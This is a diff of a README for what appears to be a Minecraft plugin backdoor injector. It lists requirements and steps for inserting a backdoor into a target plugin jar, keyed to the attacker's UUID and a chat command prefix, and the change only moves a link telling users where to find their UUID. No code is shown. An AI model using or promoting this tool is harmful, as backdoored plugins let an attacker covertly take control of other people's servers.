@@ -13,6 +13,7 @@ This is pretty much a finished project in my mind, but if you come up with somet
 ### Injector:
 * Java 8 runtime.
 * Desired target plugin jar file.
+* Your Minecraft UUID. (You can find your UUID at: [NameMC](https://www.NameMC.com))
 ### Manual Injection:
 * Java 8 JDK.
 * Desired plugin source code.
@@ -23,7 +24,7 @@ This is pretty much a finished project in my mind, but if you come up with somet
 ### Injector:
 * Run backdoor-(version).jar.
 * Select desired plugin file.
-* Input your Minecraft UUID. (You can find your UUID at: [NameMC](https://www.NameMC.com))
+* Input your Minecraft UUID.
 * Input chat command prefix. (Default: #)
 
 ### Manual Injection:
